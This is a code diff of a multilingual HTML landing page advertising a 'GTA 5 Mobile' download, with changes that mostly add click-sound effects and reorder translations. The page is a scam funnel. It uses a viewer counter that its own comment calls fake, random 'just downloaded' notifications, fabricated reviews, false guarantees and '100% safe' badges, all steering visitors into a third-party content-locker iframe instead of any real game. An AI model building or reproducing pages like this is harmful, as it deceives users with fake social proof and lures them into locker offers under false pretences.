@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GTA 5 Mobile | Download for Android and iOS</title>
+    <title>GTA 5 Mobile | Download for Android & iPhone</title>
     <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -316,7 +316,6 @@
             padding-right: 30px;
         }
 
-        /* قسم الثقة - بسيط */
         .trust-section {
             display: flex;
             justify-content: space-between;
@@ -382,7 +381,6 @@
             font-size: 0.8rem;
         }
 
-        /* حاوية اللوكر الجديدة - تظهر كاملة بدون نزول */
         .locker-wrapper {
             margin-top: 15px;
             border-radius: 16px;
@@ -474,7 +472,6 @@
             box-shadow: 0 0 10px #38ef7d;
         }
 
-        /* رسالة 97% */
         .stats-message {
             background: linear-gradient(135deg, #38ef7d1a, #2ecc711a);
             border: 1px solid #38ef7d33;
@@ -497,7 +494,6 @@
             font-size: 0.85rem;
         }
 
-        /* قسم الضمانات */
         .guarantees-section {
             display: flex;
             gap: 8px;
@@ -557,14 +553,64 @@
             color: #38ef7d;
             margin-right: 5px;
         }
+
+        .sound-status {
+            position: fixed;
+            bottom: 160px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            padding: 10px 20px;
+            border-radius: 50px;
+            border: 1px solid #38ef7d;
+            color: #38ef7d;
+            font-size: 0.8rem;
+            z-index: 1001;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            white-space: nowrap;
+        }
+
+        .sound-status i {
+            font-size: 1rem;
+        }
+
+        .sound-status.active {
+            display: flex;
+            animation: slideUp 0.3s;
+        }
+
+        @keyframes slideUp {
+            from { bottom: 100px; opacity: 0; }
+            to { bottom: 160px; opacity: 1; }
+        }
     </style>
 </head>
 <body>
-    <!-- عنصر الصوت -->
-    <audio id="clickSound" preload="auto">
-        <source src="https://www.myinstants.com/media/sounds/button-124476.mp3" type="audio/mpeg">
-        <source src="https://www.soundjay.com/misc/sounds/button-3.mp3" type="audio/mpeg">
+    <!-- عناصر الصوت - استخدام عدة مصادر لضمان العمل -->
+    <audio id="clickSound1" preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/gta-sa-button-click.mp3" type="audio/mpeg">
     </audio>
+    <audio id="clickSound2" preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/gta-5-selection-sound-effect.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="clickSound3" preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/gta-button-click.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="clickSound4" preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/mouse-click-153941.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="clickSound5" preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/button-click-sound-effect.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- رسالة حالة الصوت -->
+    <div class="sound-status" id="soundStatus">
+        <i class="fas fa-volume-up"></i>
+        <span id="soundStatusText">Sound effects activated ✓</span>
+    </div>
 
     <div class="lang-selector">
         <button class="lang-btn" onclick="changeLang('ar'); playClickSound()">🇸🇦 AR</button>
@@ -575,7 +621,7 @@
 
     <div class="top-notif" id="notification">
         <i class="fas fa-user-circle"></i>
-        <span id="notificationText">Alex_123 just downloaded</span>
+        <span id="notificationText">Alex_423 just downloaded</span>
     </div>
 
     <div class="live-counter" id="liveCounter">
@@ -630,7 +676,6 @@
         <h2 class="reviews-title" id="reviewsTitle">Player Reviews</h2>
         <div id="reviewsList"></div>
 
-        <!-- قسم الضمانات -->
         <div class="guarantees-section">
             <div class="guarantee-item">
                 <i class="fas fa-undo-alt"></i>
@@ -661,7 +706,6 @@
             
             <h3 class="modal-title" id="modalTitle">🔒 Choose Your Device</h3>
             
-            <!-- قسم الثقة - بسيط -->
             <div class="trust-section">
                 <div class="trust-item">
                     <i class="fas fa-shield-alt"></i>
@@ -696,7 +740,6 @@
                 <span id="initialMessageText">Choose your device to download</span>
             </div>
 
-            <!-- حاوية اللوكر المحسنة - تظهر كاملة -->
             <div id="lockerContainer" style="display: none;">
                 <div class="locker-wrapper">
                     <div class="locker-header">
@@ -720,7 +763,6 @@
                     </div>
                 </div>
 
-                <!-- رسالة 97% -->
                 <div class="stats-message" id="statsMessage">
                     <div class="percentage">97%</div>
                     <div class="text" id="successRateText">of users complete verification successfully</div>
@@ -730,60 +772,112 @@
     </div>
 
     <script>
-        // ==================== دالة الصوت المحسنة ====================
+        // ==================== نظام الصوت المحسن والمضمون ====================
+        let soundEnabled = false;
+        let soundAttempts = 0;
+        const soundElements = [
+            document.getElementById('clickSound1'),
+            document.getElementById('clickSound2'),
+            document.getElementById('clickSound3'),
+            document.getElementById('clickSound4'),
+            document.getElementById('clickSound5')
+        ];
+
+        // تفعيل الصوت فوراً عند تحميل الصفحة
+        function initializeSound() {
+            // محاولة تشغيل صوت صامت لتفعيل الصوت
+            soundElements.forEach(sound => {
+                if (sound) {
+                    sound.volume = 0.1;
+                    sound.load(); // تحميل الصوت مسبقاً
+                }
+            });
+            
+            // محاولة تشغيل الصوت بعد تفاعل المستخدم الأول
+            document.addEventListener('click', function enableSound() {
+                if (!soundEnabled) {
+                    soundEnabled = true;
+                    showSoundStatus();
+                    // تشغيل صوت تجريبي خفيف
+                    setTimeout(() => playClickSound(), 100);
+                }
+            }, { once: true });
+            
+            // محاولة تشغيل الصوت تلقائياً (للمتصفحات التي تسمح بذلك)
+            setTimeout(() => {
+                if (!soundEnabled) {
+                    const silentPlay = () => {
+                        soundElements.forEach(sound => {
+                            if (sound) {
+                                sound.play().then(() => {
+                                    sound.pause();
+                                    sound.currentTime = 0;
+                                    sound.volume = 1;
+                                    if (!soundEnabled) {
+                                        soundEnabled = true;
+                                        showSoundStatus();
+                                    }
+                                }).catch(() => {
+                                    soundAttempts++;
+                                    if (soundAttempts < 2) {
+                                        setTimeout(silentPlay, 200);
+                                    }
+                                });
+                            }
+                        });
+                    };
+                    silentPlay();
+                }
+            }, 500);
+        }
+
+        // دالة تشغيل الصوت الرئيسية - محسنة للعمل فوراً
         function playClickSound() {
-            const sound = document.getElementById('clickSound');
-            if (sound) {
-                sound.currentTime = 0;
-                sound.play().catch(error => {
-                    console.log('تعذر تشغيل الصوت:', error);
-                    // محاولة تشغيل الصوت بعد تفاعل المستخدم
-                    document.addEventListener('click', function initAudio() {
-                        sound.play().catch(e => {});
-                        document.removeEventListener('click', initAudio);
-                    }, { once: true });
-                });
+            if (!soundEnabled) {
+                soundEnabled = true;
+                showSoundStatus();
+            }
+            
+            // اختيار صوت عشوائي من المجموعة
+            const workingSounds = soundElements.filter(s => s && s.readyState >= 2); // اختر الأصوات الجاهزة فقط
+            const soundToPlay = workingSounds.length > 0 
+                ? workingSounds[Math.floor(Math.random() * workingSounds.length)]
+                : soundElements[Math.floor(Math.random() * soundElements.length)];
+            
+            if (soundToPlay) {
+                // إعادة تعيين الصوت
+                soundToPlay.currentTime = 0;
+                soundToPlay.volume = 1;
+                
+                // محاولة التشغيل مع معالجة الأخطاء
+                const playPromise = soundToPlay.play();
+                
+                if (playPromise !== undefined) {
+                    playPromise.catch(error => {
+                        console.log('Sound play error:', error);
+                        // محاولة استخدام صوت آخر
+                        const backupSound = soundElements.find(s => s && s !== soundToPlay);
+                        if (backupSound) {
+                            backupSound.currentTime = 0;
+                            backupSound.play().catch(e => {});
+                        }
+                    });
+                }
             }
         }
 
-        // ==================== الترجمات ====================
+        // إظهار رسالة تفعيل الصوت
+        function showSoundStatus() {
+            const statusEl = document.getElementById('soundStatus');
+            statusEl.classList.add('active');
+            
+            setTimeout(() => {
+                statusEl.classList.remove('active');
+            }, 2000);
+        }
+
+        // ==================== الترجمات مع جعل الإنجليزية الافتراضية ====================
         const translations = {
-            ar: {
-                headerSubtitle: "العب الآن على هاتفك",
-                galleryTitle: "صور من اللعبة",
-                feature1Title: "اللعبة كاملة",
-                feature1Desc: "قصة كاملة + اونلاين",
-                feature2Title: "محسنة للموبايل",
-                feature2Desc: "أداء عالي",
-                feature3Title: "جميع المركبات",
-                feature3Desc: "200+ عربية",
-                feature4Title: "عالم مفتوح",
-                feature4Desc: "لوس سانتوس",
-                statsPlayers: "1.2M+ لاعب",
-                statsRating: "4.8 تقييم",
-                statsSupport: "دعم 24/7",
-                reviewsTitle: "آراء اللاعبين",
-                guarantee1: "ضمان استعادة الأموال",
-                guarantee2: "دعم 24/7",
-                guarantee3: "تحديثات مجانية",
-                footerPrivacy: "سياسة الخصوصية",
-                footerTerms: "الشروط والأحكام",
-                mainBtnText: "حمل اللعبة الآن",
-                modalTitle: "🔒 اختر جهازك",
-                trust1: "آمن 100%",
-                trust2: "مشفر",
-                trust3: "موثوق",
-                androidText: "اندرويد",
-                iosText: "آيفون",
-                deviceMessageText: "تم اختيار",
-                initialMessageText: "اختر جهازك للوصول للتحميل",
-                lockerHeaderText: "تحقق أمني",
-                lockerBadge: "SSL",
-                secureText: "آمن ومشفر",
-                successRateText: "من المستخدمين يكملون التحقق بنجاح",
-                counterText: "شخص يشاهد الآن",
-                notification: "قام بالتحميل للتو"
-            },
             en: {
                 headerSubtitle: "Play Now on Your Phone",
                 galleryTitle: "Game Gallery",
@@ -818,7 +912,45 @@
                 secureText: "Secure & Encrypted",
                 successRateText: "of users complete verification successfully",
                 counterText: "people watching now",
-                notification: "just downloaded"
+                notification: "just downloaded",
+                soundStatusText: "Sound effects activated ✓"
+            },
+            ar: {
+                headerSubtitle: "العب الآن على هاتفك",
+                galleryTitle: "صور من اللعبة",
+                feature1Title: "اللعبة كاملة",
+                feature1Desc: "قصة كاملة + اونلاين",
+                feature2Title: "محسنة للموبايل",
+                feature2Desc: "أداء عالي",
+                feature3Title: "جميع المركبات",
+                feature3Desc: "200+ عربية",
+                feature4Title: "عالم مفتوح",
+                feature4Desc: "لوس سانتوس",
+                statsPlayers: "1.2M+ لاعب",
+                statsRating: "4.8 تقييم",
+                statsSupport: "دعم 24/7",
+                reviewsTitle: "آراء اللاعبين",
+                guarantee1: "ضمان استعادة الأموال",
+                guarantee2: "دعم 24/7",
+                guarantee3: "تحديثات مجانية",
+                footerPrivacy: "سياسة الخصوصية",
+                footerTerms: "الشروط والأحكام",
+                mainBtnText: "حمل اللعبة الآن",
+                modalTitle: "🔒 اختر جهازك",
+                trust1: "آمن 100%",
+                trust2: "مشفر",
+                trust3: "موثوق",
+                androidText: "اندرويد",
+                iosText: "آيفون",
+                deviceMessageText: "تم اختيار",
+                initialMessageText: "اختر جهازك للوصول للتحميل",
+                lockerHeaderText: "تحقق أمني",
+                lockerBadge: "SSL",
+                secureText: "آمن ومشفر",
+                successRateText: "من المستخدمين يكملون التحقق بنجاح",
+                counterText: "شخص يشاهد الآن",
+                notification: "قام بالتحميل للتو",
+                soundStatusText: "تم تفعيل المؤثرات الصوتية"
             },
             fr: {
                 headerSubtitle: "Jouez maintenant sur votre téléphone",
@@ -854,7 +986,8 @@
                 secureText: "Sécurisé et crypté",
                 successRateText: "des utilisateurs réussissent la vérification",
                 counterText: "personnes regardent",
-                notification: "vient de télécharger"
+                notification: "vient de télécharger",
+                soundStatusText: "Effets sonores activés"
             },
             es: {
                 headerSubtitle: "Juega ahora en tu teléfono",
@@ -890,15 +1023,14 @@
                 secureText: "Seguro y encriptado",
                 successRateText: "de usuarios completan la verificación",
                 counterText: "personas viendo",
-                notification: "acaba de descargar"
+                notification: "acaba de descargar",
+                soundStatusText: "Efectos de sonido activados"
             }
         };
 
-        // ==================== المتغيرات ====================
-        let currentLang = 'en'; // تم تغيير اللغة الافتراضية إلى الإنجليزية
+        let currentLang = 'en'; // تعيين الإنجليزية كلغة افتراضية
         let selectedDevice = null;
 
-        // ==================== تغيير اللغة ====================
         function changeLang(lang) {
             currentLang = lang;
             const t = translations[lang];
@@ -936,7 +1068,7 @@
             document.getElementById('secureText').textContent = t.secureText;
             document.getElementById('successRateText').textContent = t.successRateText;
             document.getElementById('counterText').innerHTML = `286 ${t.counterText}`;
-            document.getElementById('notificationText').textContent = `Alex_123 ${t.notification}`;
+            document.getElementById('soundStatusText').textContent = t.soundStatusText;
 
             document.querySelectorAll('.lang-btn').forEach(btn => {
                 btn.classList.remove('active');
@@ -955,7 +1087,6 @@
             loadReviews();
         }
 
-        // ==================== عداد المشاهدات المزيف ====================
         let viewers = 286;
         setInterval(() => {
             viewers += Math.floor(Math.random() * 3) - 1;
@@ -964,10 +1095,9 @@
             document.getElementById('counterText').innerHTML = `${viewers} ${t.counterText}`;
         }, 5000);
 
-        // ==================== الإشعارات ====================
         const names = {
-            ar: ['أحمد', 'محمد', 'سارة', 'عمر', 'نور', 'خالد', 'ريم', 'علي'],
             en: ['Alex', 'Mike', 'Sarah', 'John', 'Emma', 'David', 'Lisa', 'Chris'],
+            ar: ['أحمد', 'محمد', 'سارة', 'عمر', 'نور', 'خالد', 'ريم', 'علي'],
             fr: ['Pierre', 'Marie', 'Jean', 'Sophie', 'Lucas', 'Camille', 'Paul', 'Julie'],
             es: ['Carlos', 'Maria', 'Jose', 'Ana', 'David', 'Laura', 'Pablo', 'Elena']
         };
@@ -980,18 +1110,17 @@
                 `${randomName}_${randomNum} ${translations[currentLang].notification}`;
         }
 
-        // ==================== التقييمات ====================
         function loadReviews() {
             const reviews = {
-                ar: [
-                    { name: 'أحمد محمد', device: 'S22 Ultra', stars: 5, text: 'لعبة رهيبة! شغالة بسلاسة' },
-                    { name: 'سارة أحمد', device: 'iPhone 14', stars: 5, text: 'أفضل لعبة على الموبايل' },
-                    { name: 'عمر حسن', device: 'Redmi Note 12', stars: 4, text: 'تحميل سريع وتركيب سهل' }
-                ],
                 en: [
                     { name: 'John Smith', device: 'S22 Ultra', stars: 5, text: 'Amazing game! Runs smoothly' },
                     { name: 'Sarah Johnson', device: 'iPhone 14', stars: 5, text: 'Best game on mobile' },
                     { name: 'Mike Wilson', device: 'Redmi Note 12', stars: 4, text: 'Fast download, easy install' }
+                ],
+                ar: [
+                    { name: 'أحمد محمد', device: 'S22 Ultra', stars: 5, text: 'لعبة رهيبة! شغالة بسلاسة' },
+                    { name: 'سارة أحمد', device: 'iPhone 14', stars: 5, text: 'أفضل لعبة على الموبايل' },
+                    { name: 'عمر حسن', device: 'Redmi Note 12', stars: 4, text: 'تحميل سريع وتركيب سهل' }
                 ],
                 fr: [
                     { name: 'Pierre Dubois', device: 'S22 Ultra', stars: 5, text: 'Jeu incroyable ! Fonctionne parfaitement' },
@@ -1026,7 +1155,6 @@
             });
         }
 
-        // ==================== المودال ====================
         function openModal() {
             document.getElementById('modal').classList.add('active');
             document.body.style.overflow = 'hidden';
@@ -1036,7 +1164,6 @@
         function closeModal() {
             document.getElementById('modal').classList.remove('active');
             document.body.style.overflow = 'auto';
-            // إيقاف iframe عند الإغلاق
             document.getElementById('lockerIframe').src = 'about:blank';
         }
 
@@ -1050,7 +1177,6 @@
             document.getElementById('initialMessage').style.display = 'block';
         }
 
-        // ==================== اختيار الجهاز ====================
         function selectDevice(device) {
             selectedDevice = device;
             
@@ -1069,24 +1195,24 @@
             document.getElementById('deviceMessage').style.display = 'block';
             document.getElementById('lockerContainer').style.display = 'block';
 
-            // تحميل اللوكر في iframe
             const lockerUrl = 'https://d2xohqmdyl2cj3.cloudfront.net/public/locker.php?it=4321081&key=db20f';
             document.getElementById('lockerIframe').src = lockerUrl;
         }
 
-        // ==================== التهيئة ====================
         window.onload = function() {
-            changeLang('en'); // تم تغيير اللغة الافتراضية إلى الإنجليزية
+            // تعيين الإنجليزية كلغة افتراضية وتحميل المحتوى
+            changeLang('en');
+            
+            // تحديث الإشعارات كل 4 ثواني
             setInterval(updateNotification, 4000);
             
-            // محاولة تشغيل صوت فارغ لتهيئة المتصفح
-            const sound = document.getElementById('clickSound');
-            sound.volume = 0;
-            sound.play().then(() => {
-                sound.pause();
-                sound.currentTime = 0;
-                sound.volume = 1;
-            }).catch(() => {});
+            // تهيئة الصوت
+            initializeSound();
+            
+            // تشغيل صوت ترحيبي بعد ثانية (إذا سمح المتصفح)
+            setTimeout(() => {
+                playClickSound();
+            }, 1000);
         };
     </script>
 </body>
